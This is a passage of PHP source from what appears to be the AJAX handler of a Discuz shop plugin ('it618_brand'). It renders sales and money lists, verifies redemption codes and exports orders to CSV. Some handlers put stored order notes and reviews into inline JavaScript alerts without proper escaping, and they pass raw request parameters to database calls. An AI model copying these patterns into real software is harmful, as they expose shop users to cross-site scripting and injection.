				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
		
		$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$ShopUid);
		
		echo '<span style="font-size:12px">'.it618_brand_getlang('s1172').'<font color="red">'.$count.'</font> '.it618_brand_getlang('s1173').'<font color="red">'.$summoney.'</font> '.it618_brand_getlang('s389').' '.it618_brand_getlang('s1174').'<font color="red">'.$sumscore.'</font> '.$creditname.'</span>it618_split<table width="100%" style="font-size:12px;margin-top:10px;margin-bottom:10px" id="moneylist">'.$th.$money_get.'</table>it618_split'.$multipage.'it618_split'.$creditnum;
	}
}


if($_GET['ac']=="moneylist_get"){
	$ppp = 15;
	if($_GET['wap']==0){
		$th='<tr><th>'.it618_brand_getlang('s1175').'</th><th width=80>'.it618_brand_getlang('s1176').'</th><th width=80>'.it618_brand_getlang('s1177').'</th><th>'.it618_brand_getlang('s1431').'</th><th width=120>'.it618_brand_getlang('s1178').'</th></tr>';
	}else{
		$ppp = 15;
		$th='<tr><th style="padding-bottom:6px">'.it618_brand_getlang('s1175').'</th><th>'.it618_brand_getlang('s1176').'</th><th>'.it618_brand_getlang('s1177').'</th><th>'.it618_brand_getlang('s1178').'</th></tr><tr></tr>';
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;

	$count = C::t('#it618_brand#it618_brand_money')->count_by_shopid($_GET['it618_shopid'], 0, 1, 0, $_G['uid'], 0, $_GET['it618_time1'], $_GET['it618_time2']);
	$summoney = C::t('#it618_brand#it618_brand_money')->sum_by_shopid($_GET['it618_shopid'], 0, 1, 0, $_G['uid'], 0, $_GET['it618_time1'], $_GET['it618_time2']);
	$sumscore = C::t('#it618_brand#it618_brand_money')->sum_it618_score_by_shopid($_GET['it618_shopid'], 0, 1, 0, $_G['uid'], 0, $_GET['it618_time1'], $_GET['it618_time2']);
	
	foreach(C::t('#it618_brand#it618_brand_money')->fetch_all_by_shopid($_GET['it618_shopid'] ,0 , 1, 0,$_G['uid'], 0, $_GET['it618_time1'], $_GET['it618_time2'], $startlimit,$ppp) as $it618_brand_money)    {

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;
		$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_money['it618_shopid']);
		
		if($_GET['wap']==0){
			$tmpurl=it618_brand_getrewrite('shop_home',$it618_brand_brand['id'],'plugin.php?id=it618_brand:shop&sid='.$it618_brand_brand['id']);
			
			$money_get.='<tr class="hover"><td><a href="'.$tmpurl.'" target="_blank" title="'.it618_brand_getlang('s1432').$it618_brand_brand['id'].'">'.$it618_brand_brand['it618_name'].'</a></td><td><font color="red">'.$it618_brand_money['it618_money'].' '.it618_brand_getlang('s389').'</font></td><td><font color="red">'.$it618_brand_money['it618_score'].'</font> '.$creditname.'</td><td>'.$it618_brand_money['it618_bz'].'</td><td><font color="#999">'.date('Y-m-d H:i:s', $it618_brand_money['it618_time']).'</font></td></tr>';
		}else{
			$tmpurl=it618_brand_getrewrite('brand_wap','shop@'.$it618_brand_brand['id'],'plugin.php?id=it618_brand:wap&pagetype=shop&sid='.$it618_brand_brand['id']);
			
			$money_get.='<tr class="hover"><td><a href="'.$tmpurl.'" target="_blank">'.$it618_brand_brand['it618_name'].'</a></td><td align="center"><font color="red">'.$it618_brand_money['it618_money'].' '.it618_brand_getlang('s389').'</font></td><td align="center"><font color="green">'.$it618_brand_money['it618_score'].'</font> '.$creditname.'</td><td align="center"><font color="#999">'.date('Y-m-d', $it618_brand_money['it618_time']).'</font></td></tr>';
		}
		
	}
	
	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getmysale1list(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getmysale1list(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getmysale1list(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		
		echo it618_brand_getlang('s1172').'<font color="red">'.$count.'</font> '.it618_brand_getlang('s1173').'<font color="red">'.$summoney.'</font> '.it618_brand_getlang('s389').' '.it618_brand_getlang('s1174').'<font color="red">'.$sumscore.'</font> '.$creditname.'it618_split'.$th.$money_get.'it618_split'.$multipage;
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$funname='getmysalelist1';
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
		
		echo '<span style="font-size:12px">'.it618_brand_getlang('s1172').'<font color="red">'.$count.'</font> '.it618_brand_getlang('s1173').'<font color="red">'.$summoney.'</font> '.it618_brand_getlang('s389').' '.it618_brand_getlang('s1174').'<font color="red">'.$sumscore.'</font> '.$creditname.'</span>it618_split<table width="100%" style="font-size:12px;margin-top:10px;margin-bottom:10px" id="moneylist">'.$th.$money_get.'</table>it618_split'.$multipage;
	}
	
	
}


if($_GET['ac']=="checkcode"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['ac2'])){
			$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxssale',$uid,$ShopId);
			if($count==0){
				echo 'it618_split'.$it618_brand_lang['s1699'];exit;
			}
		}else{
			if(isset($_GET['adminsid'])){
				$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
				if(!in_array($_G['uid'],$shopadmin)){
					echo 'it618_split'.it618_brand_getlang('s1220');exit;
				}
			}else{
				$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
				if($it618_brand_brand['it618_uid']!=$uid){
					echo 'it618_split'.it618_brand_getlang('s671');exit;
				}
			}
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		if(C::t('#it618_brand#it618_brand_sale')->count_by_it618_code_shopid($_GET['code'],$_GET['sid'])>0){
			$it618_brand_sale=C::t('#it618_brand#it618_brand_sale')->fetch_by_it618_code_shopid($_GET['code'],$_GET['sid']);
			$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_sale['it618_pid']);
			
			if($it618_brand_sale['it618_alipayid']==''){
				$it618_type=it618_brand_getlang('s592');
			}else{
				$it618_type=it618_brand_getlang('s593');
			}
			
			$gtypename='';
			if($it618_brand_sale['it618_gtypeid']>0){
				$gtypename = C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_sale['it618_gtypeid']);
				$gtypename=' [<font color=green>'.$gtypename.'</font>]';
			}
			
			if($_GET['wap']==0){
				$tmpurl=it618_brand_getrewrite('shop_product',$ShopId.'@'.$it618_brand_goods['id'],'plugin.php?id=it618_brand:product&sid='.$ShopId.'&pid='.$it618_brand_goods['id']);
			}else{
				$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$ShopId.'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$ShopId.'&cid='.$it618_brand_goods['id']);
			}
			
			if($it618_brand_sale['it618_bz']!=''){
				$it618_bz='<a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_brand_sale['it618_bz'].'\')">'.$it618_brand_lang['s1208'].'</a>';
			}
			
			$username=it618_brand_getusername($it618_brand_sale['it618_uid']);
			
			if($_GET['wap']==0){
				echo 'okit618_split'.it618_brand_getlang('s672').'<span>'.$it618_brand_goods['it618_name'].'</span><br>'.it618_brand_getlang('s673').'<span>'.$gtypename.' '.$it618_brand_sale['it618_price'].'</span><br>'.it618_brand_getlang('s674').'<span>'.$it618_brand_sale['it618_score'].'</span><br>'.it618_brand_getlang('s675').'<span>'.$it618_type.'</span><br>'.it618_brand_getlang('s676').'<span>'.$it618_brand_sale['it618_count'].'</span><br>'.it618_brand_getlang('s677').'<span>'.$username.'</span><br>'.it618_brand_getlang('s678').'<span>'.date('Y-m-d H:i:s', $it618_brand_sale['it618_time']).' '.$it618_bz.'</span><br><a href="'.$tmpurl.'" target="_blank"><img src="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" class="saleimg" /><input type="hidden" id="saleid" value="'.$it618_brand_sale['id'].'"></a>';
			}else{
				echo 'okit618_split<table width="100%" style="margin-top:10px">
			<tr><td width=118><a href="'.$tmpurl.'" target="_blank"><img src="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" height="108" /></a></td>
			<td style="vertical-align:top">'.$it618_brand_goods['it618_name'].'</a> &nbsp;&nbsp;'.$gtypename.'<br>'.it618_brand_getlang('s673').'<span>'.$gtypename.' '.$it618_brand_sale['it618_price'].'</span><br>'.it618_brand_getlang('s674').'<span>'.$it618_brand_sale['it618_score'].'</span><br>'.it618_brand_getlang('s676').'<span>'.$it618_brand_sale['it618_count'].'</span></td></tr>
			<tr><td colspan=2><br>'.it618_brand_getlang('s675').'<span>'.$it618_type.'</span><br>'.it618_brand_getlang('s677').'<span>'.$username.'</span><br>'.it618_brand_getlang('s678').'<span>'.date('Y-m-d H:i:s', $it618_brand_sale['it618_time']).' '.$it618_bz.'</span></td></tr></table><input type="hidden" id="saleid" value="'.$it618_brand_sale['id'].'">';
			}
			
		}else{
			echo 'it618_split'.it618_brand_getlang('s679');exit;
		}
		
	}
}


if($_GET['ac']=="getshopslist"){
	echo getshopslist($_GET['it618_area'],$_GET['it618_area1'],it618_brand_utftogbk($_GET['pname']),$_GET['porderby'],$_GET['page']);
}


if($_GET['ac']=="getgoodslist"){
	echo getgoodslist($_GET['it618_area'],$_GET['it618_area1'],$_GET['it618_class'],$_GET['it618_class1'],$_GET['ptype'],it618_brand_utftogbk($_GET['pname']),$_GET['pprice1'],$_GET['pprice2'],$_GET['porderby'],$_GET['page']);
}


if($_GET['ac']=="sale_dao"){
	if(isset($_GET['adminsid'])){
		$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
		if(!in_array($_G['uid'],$shopadmin)){
			echo 'it618_split'.it618_brand_getlang('s1220');exit;
		}
	}else{
		$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
		if($it618_brand_brand['it618_uid']!=$uid){
			echo 'it618_split'.it618_brand_getlang('s671');exit;
		}
	}
	
	if($_GET['paytype']) {
		if($_GET['paytype']==0)$it618sql = " ";
		if($_GET['paytype']==1)$it618sql = "and s.it618_type = 1 ";
		if($_GET['paytype']==2)$it618sql = "and s.it618_type = 2 ";
	}
	
	if($_GET['state']) {
		if($_GET['state']==0)$it618sql .= "";
		if($_GET['state']==1)$it618sql .= "and s.it618_state = 1";
		if($_GET['state']==2)$it618sql .= "and s.it618_state = 2";
		if($_GET['state']==3)$it618sql .= "and s.it618_state = 3";
		if($_GET['state']==4)$it618sql .= "and s.it618_state = 4";
	}
	
	$strtmp=$it618_brand_lang['s1136']."\n";
	foreach(C::t('#it618_brand#it618_brand_sale')->fetch_all_by_shopid(
		$ShopId,"s.it618_type!=0 ".$it618sql,'s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],0,0
	) as $it618_brand_sale) {
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_sale['it618_pid']);
		
		$gtypename='';
		if($it618_brand_sale['it618_gtypeid']>0){
			$gtypename = C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_sale['it618_gtypeid']);
		}
		
		$it618_saletype='';
		if($it618_brand_sale['it618_saletype']==1)$it618_saletype=it618_brand_getlang('s1245');
		if($it618_brand_sale['it618_saletype']==2)$it618_saletype=it618_brand_getlang('s1246');
		if($it618_brand_sale['it618_saletype']==3)$it618_saletype=it618_brand_getlang('s1247');
		if($it618_brand_sale['it618_saletype']==5)$it618_saletype=it618_brand_getlang('s1658');
		if($it618_brand_sale['it618_saletype']==6)$it618_saletype=it618_brand_getlang('s857').' '.$it618_brand_sale['it618_prepaybl'].'%';
		
		if($it618_brand_sale['it618_gwcid']>0){
			$it618_saletype.=' '.$it618_brand_lang['t192'].':'.$it618_brand_sale['it618_gwcid'];
		}
		
		$it618_kddan='';
		if($it618_brand_sale['it618_kdid']>0){
			$it618_brand_kd=C::t('#it618_brand#it618_brand_kd')->fetch_by_id($it618_brand_sale['it618_kdid']);
			$it618_kddan=it618_brand_getlang('s1159').$it618_brand_kd['it618_name'].' '.$it618_brand_sale['it618_kddan'];
		}
		
		$strtmp.=$it618_brand_goods['it618_name'].",".$gtypename.",".$it618_brand_sale['it618_count'].",".$it618_saletype.",".it618_brand_getusername($it618_brand_sale['it618_uid'])." ".$it618_brand_sale['it618_addr']." ".$it618_brand_sale['it618_bz']." ".$it618_kddan.",".date('Y-m-d H:i:s', $it618_brand_sale['it618_time']).",".$it618_brand_sale['it618_salebz']."\n";
		$datacount=$datacount+1;
	}
	
	$datapath1=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/';
	if(!file_exists($datapath1)) {
		mkdir($datapath1);
	}
	$datapath=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/dao/';
	if(!file_exists($datapath)) {
		mkdir($datapath);
	}
	$timestr=md5(date("YmdHis").FORMHASH) . '_' . $datacount;
	it618_brand_delfile($datapath);
	
	@$fp = fopen($datapath.$timestr.'.csv',"w");
	if(!$fp){
		echo "system error";
		exit();
	}else {
		fwrite($fp,$strtmp);
		fclose($fp);
	}
	
	echo $_G['siteurl'].'source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/dao/'.$timestr.'.csv';
}


if($_GET['ac']=="sale_get"){
	if(isset($_GET['ac2'])){
		$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxssale',$uid,$ShopId);
		if($count==0){
			echo 'it618_split'.$it618_brand_lang['s1699'];exit;
		}
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
	}
	$time=$_G['timestamp']-3600*24*$it618_brand['brand_autodatecount'];
	foreach(C::t('#it618_brand#it618_brand_sale')->fetch_all_by_shopid(0,'s.it618_time<'.$time." and s.it618_state=1 and s.it618_kddan!='' and s.it618_saletype=2 and (s.it618_state_tuihuo=0 or s.it618_state_tuihuo=3)") as $it618_brand_sale) {
		it618_brand_qrxf($it618_brand_sale['id']);
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($_GET['ac1']=='pcsale'){
		$ppp = $Shop_systemcount;
		$funname='getsalelist';
	}
	if($_GET['ac1']=='wapsale'){
		$ppp = 10;
		$funname='getsalelist';
	}
	
	if($_GET['paytype']) {
		if($_GET['paytype']==0)$it618sql = " ";
		if($_GET['paytype']==1)$it618sql = "and s.it618_type = 1 ";
		if($_GET['paytype']==2)$it618sql = "and s.it618_type = 2 ";
	}
	
	if($_GET['state']) {
		if($_GET['state']==0)$it618sql .= "";
		if($_GET['state']==1)$it618sql .= "and s.it618_state = 1";
		if($_GET['state']==2)$it618sql .= "and s.it618_state = 2";
		if($_GET['state']==3)$it618sql .= "and s.it618_state = 3";
		if($_GET['state']==4)$it618sql .= "and s.it618_state = 4";
	}
	
	$count = C::t('#it618_brand#it618_brand_sale')->count_by_shopid($ShopId,"s.it618_type!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;

	$tmp='<option value="0">'.it618_brand_getlang('s1188').'</option>';
	foreach(C::t('#it618_brand#it618_brand_kd')->fetch_all_by_shopid($ShopId) as $it618_brand_kd) {
		$tmp.='<option value='.$it618_brand_kd['id'].'>'.$it618_brand_kd['it618_name'].'</option>';
	}
			
	foreach(C::t('#it618_brand#it618_brand_sale')->fetch_all_by_shopid(
		$ShopId,"s.it618_type!=0 ".$it618sql,'s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_brand_sale) {
		
		$isgoodsdel=0;$gtypename='';$gtypename1='';
		if($it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_sale['it618_pid'])){
			$goodsname = $it618_brand_goods['it618_name'];
			$gtypename = C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_sale['it618_gtypeid']);
		}else{
			$isgoodsdel=1;
			$goodsname = $it618_brand_sale['it618_pname'];
			$gtypename = $it618_brand_sale['it618_gtypename'];
		}
		
		if($it618_brand_sale['it618_state']==1)$it618_state='<font color=red>'.it618_brand_getlang('s1118').'</font>';
		if($it618_brand_sale['it618_state']==2){
			$it618_state='<font color=green>'.it618_brand_getlang('s1119').'</font>';
			if($it618_brand_sale['it618_pj']==0){
				$it618_state.=' '.it618_brand_getlang('s1294');
			}else{
				if($it618_brand_sale['it618_pj']==1)$pjstr=' <font color=red>'.it618_brand_getlang('s1266').'</font>';
				if($it618_brand_sale['it618_pj']==2)$pjstr=' <font color=red>'.it618_brand_getlang('s1267').'</font>';
				if($it618_brand_sale['it618_pj']==3)$pjstr=' <font color=red>'.it618_brand_getlang('s1268').'</font>';
				
				if($it618_brand_sale['it618_content_pj']!='')$it618_content_pj=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_brand_sale['it618_content_pj'].'\')">'.it618_brand_getlang('s1255').'</a>';
				
				$it618_state.=$pjstr.' '.$it618_content_pj;
			}
		}
		if($it618_brand_sale['it618_state']==3)$it618_state='<font color=blue>'.it618_brand_getlang('s1120').'</font>';
		if($it618_brand_sale['it618_state']==4)$it618_state='<font color=purple>'.it618_brand_getlang('s1121').'</font>';
		
		if($it618_brand_sale['it618_gtypeid']>0){
			$gtypename1='<span style="float:right">['.$gtypename.']</span>';
			$gtypename='['.$gtypename.']';
		}
		
		$it618_brand_sale['it618_bz']=str_replace("'","\'",$it618_brand_sale['it618_bz']);
		$it618_brand_sale['it618_addr']=str_replace("'","\'",$it618_brand_sale['it618_addr']);
		
		if($_GET['ac1']=='pcsale'){
		$strcontent='';
		$bz='';
		if($it618_brand_sale['it618_bz']!=""){
			$bz=' <a href="javascript:" id="bz'.$it618_brand_sale[id].'">'.it618_brand_getlang('s1189').'</a> ';
			$strcontent.='<strong>'.it618_brand_getlang('s1190').'</strong><br>'.$it618_brand_sale['it618_bz'].'<br><br>';
		}
		
		$bzbtn='';$tuistrcontent='';$kdbtn='1';
		if($it618_brand_sale['it618_saletype']==2){
			if($it618_brand_sale['it618_state']==1){
				if($it618_brand_sale['it618_kddan']==''){
					if($it618_brand_sale['it618_state_tuihuo']!=1){
						$it618_state.='<br><a href="javascript:" id="fahuo'.$it618_brand_sale[id].'">'.it618_brand_getlang('s1191').'</a>';
						$kdbtnname=it618_brand_getlang('s1192');
					}
				}else{
					$kdbtnname=it618_brand_getlang('s1193');
				}
				
				if($it618_brand_sale['it618_state_tuihuo']==1){
					$tuistrcontent=$it618_brand_sale['it618_content_tuihuo'];
					$it618_state.='<br>'.it618_brand_getlang('s1196').' <a href="javascript:" id="tui'.$it618_brand_sale[id].'">'.it618_brand_getlang('s1195').'</a><br><a href="javascript:" class="saleabtn" onclick="tongyitui('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1197').'</a> <a href="javascript:" class="saleabtn" onclick="jujuetui('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1198').'</a>';
				}
				if($it618_brand_sale['it618_state_tuihuo']==2){
					$it618_state.='<br>'.''.it618_brand_getlang('s1197').'';
				}
				if($it618_brand_sale['it618_state_tuihuo']==3){
					$it618_state.='<br>'.''.it618_brand_getlang('s1198').'';
				}
			}else{
				$kdbtnname=it618_brand_getlang('s1194');
				$kdbtn='';
			}
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			if($kdbtn!='')$kdbtn='<input type="button" class="it618btn" value="'.$kdbtnname.'" onclick="savekd()">';
			
			$it618_kddan='';
			$it618_brand_kd=C::t('#it618_brand#it618_brand_kd')->fetch_by_id($it618_brand_sale['it618_kdid']);
			if($it618_brand_sale['it618_kddan']!=''){
				$it618_kddan='<br>'.it618_brand_getlang('s1159').'<span title="'.$it618_brand_sale['it618_bz'].'" style="color:green">'.$it618_brand_kd['it618_name'].' '.$it618_brand_sale['it618_kddan'].'</span> <a href="javascript:" id="fahuo'.$it618_brand_sale[id].'">'.$kdbtnname.'</a>';
				
			}
			
			$tmp1=str_replace("<option value=".$it618_brand_kd['id'],"<option value=".$it618_brand_kd['id']." selected=selected",$tmp);
			
			$strcontent.='<div class="kd_fahuo">'.$it618_brand_sale['it618_addr'].'<br><br>'.it618_brand_getlang('s1200').'<select id="it618_kdid">'.$tmp1.'</select><input type="text" id="it618_kddan" value="'.$it618_brand_sale['it618_kddan'].'"><input type="hidden" id="saleid" value="'.$it618_brand_sale['id'].'"> '.$kdbtn.' <span style="color:red" id="kdtips"></span><br><br><font color=red>'.it618_brand_getlang('s1201').'</font></div>';
		}else{
			$it618_kddan='';
		}
		
		$strtel='';
		if($it618_brand_sale['it618_tel']!=""){
			$strtel=it618_brand_getlang('s1133').$it618_brand_sale['it618_tel'];
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$strtmp=$strtel.$bz.$it618_kddan;
		
		if($it618_brand_sale['it618_saletype']==1)$saletypestr=it618_brand_getlang('s1245');
		if($it618_brand_sale['it618_saletype']==2)$saletypestr=it618_brand_getlang('s1246');
		if($it618_brand_sale['it618_saletype']==3)$saletypestr=it618_brand_getlang('s1247');
		if($it618_brand_sale['it618_saletype']==5)$saletypestr=it618_brand_getlang('s1658');
		if($it618_brand_sale['it618_saletype']==6)$saletypestr=it618_brand_getlang('s857').' <font color=red>'.$it618_brand_sale['it618_prepaybl'].'</font>%';
		if($it618_brand_sale['it618_saletype']==6){
			$prepaybl=$it618_brand_sale['it618_prepaybl']/100;
		}else{
			$prepaybl=1;
		}
		
		$it618_tc='';
		if($it618_brand_sale['it618_type']==1){
			$it618_type=it618_brand_getlang('s1149').' '.$saletypestr;
			$hejimoney=$it618_brand_sale['it618_sfscore'];
			
			$zkstr='';	
			
			if($it618_brand_sale['it618_vipzk']>0){
				$zkstr.=' * '.$it618_brand_sale['it618_vipzk'].'%('.$it618_brand_lang['t798'].')';
			}
			$hejistr=$hejimoney.' '.$creditname.' = '.it618_brand_getlang('s921').($it618_brand_sale['it618_score']*$it618_brand_sale['it618_count']).$zkstr.' '.$creditname.' + '.it618_brand_getlang('s922').$it618_brand_sale['it618_yunfei'].' '.$creditname;
			
			$heji='<font color="red">'.$hejimoney.'</font> '.$creditname.'<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$hejistr.'\')">'.$it618_brand_lang['s1803'].'</a>';
			
			$it618_tc=$it618_brand_lang['s150'].$it618_brand_sale['it618_tcbl'].'% '.$it618_brand_sale['it618_tc'].' '.$creditname;
			
			if($it618_brand_sale['it618_tuitcbl']>0){
				$tcjfcount=intval($it618_brand_sale['it618_score']*$it618_brand_sale['it618_count']*$it618_brand_sale['it618_tuitcbl']/100);
				$it618_tc.="\n\n".$it618_brand_lang['s151'].$it618_brand_sale['it618_tuitcbl'].'% '.$tcjfcount.' '.$creditname;
			}
		}else{
			$it618_brand_money = C::t('#it618_brand#it618_brand_money')->fetch_by_saleid($it618_brand_sale['id']);
			if($it618_brand_sale['it618_gwcid']>0){
				$typestr=$it618_brand_lang['t192'].':<font color="#FF3300"><b>'.$it618_brand_sale['it618_gwcid'].'</b></font>';
			}else{
				$typestr=it618_brand_getlang('s1150');
			}
			
			$zsstr='';
			if($it618_brand_sale['it618_state']==2){
				$zsstr='<br>'.$it618_brand_lang['s1802'].'<font color="green">'.$it618_brand_money['it618_score'].'</font> '.$creditname;
			}
			
			$it618_type=''.$typestr.' '.$saletypestr.'<br>'.it618_brand_getlang('s1204').'<font color="green" title="'.it618_brand_getlang('s927').'">'.$it618_brand_sale['it618_alipaybl'].'%</font>'.$zsstr;
			if($heji<0)$heji=0;
			$hejimoney=$it618_brand_sale['it618_sfmoney'];
			if($hejimoney<0)$hejimoney=0;
			$zkstr='';	
			if($it618_brand_sale['it618_zk']!=100){
				$zkstr=' * '.$it618_brand_sale['it618_zk'].'%('.$it618_brand_lang['t799'].')';
			}
			
			if($it618_brand_sale['it618_vipzk']>0){
				$zkstr.=' * '.$it618_brand_sale['it618_vipzk'].'%('.$it618_brand_lang['t798'].')';
			}
			
			$hejistr=$hejimoney.' '.it618_brand_getlang('s389').' = '.it618_brand_getlang('s921').($it618_brand_sale['it618_price']*$it618_brand_sale['it618_count']*$prepaybl).$zkstr.' '.it618_brand_getlang('s389').' + '.it618_brand_getlang('s922').$it618_brand_sale['it618_yunfei'].' '.it618_brand_getlang('s389').' - '.it618_brand_getlang('s928').$it618_brand_sale['it618_quanmoney'].' '.it618_brand_getlang('s389');
			
			$heji='<font color="red">'.$hejimoney.'</font> '.it618_brand_getlang('s389').'<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$hejistr.'\')">'.$it618_brand_lang['s1803'].'</a>';
			
			$it618_tc=it618_brand_getlang('s1202').$it618_brand_sale['it618_tcbl'].'% '.it618_brand_getlang('s1203').$it618_brand_sale['it618_tc'].' '.it618_brand_getlang('s389');
			
			if($it618_brand_sale['it618_tuitcbl']>0){
				$it618_tc.="\n\n".$it618_brand_lang['s151'].$it618_brand_sale['it618_tuitcbl'].'% '.$it618_brand_sale['it618_tuitc'].' '.it618_brand_getlang('s389');
			}
		}
		
		$txstr='';
		if($it618_brand_sale['it618_state']==2){
			if($it618_brand_sale['it618_type']==1){
				if($it618_brand_sale['it618_tuitcbl']>0){
					$tcjfcount=intval($it618_brand_sale['it618_score']*$it618_brand_sale['it618_count']*$it618_brand_sale['it618_tuitcbl']/100);
				}
				$txstr='<font color="#F0F"><b>'.($hejimoney-$it618_brand_sale['it618_tc']-$tcjfcount).'</b></font> '.$creditname;
			}else{
				if($it618_brand_sale['it618_txtype']==1){
					$txstr=$it618_brand_lang['s1804'].'<br><font color="#F0F"><b>'.($hejimoney-$it618_brand_sale['it618_tc']-$it618_brand_sale['it618_tuitc']).'</b></font> '.it618_brand_getlang('s389');
				}else{
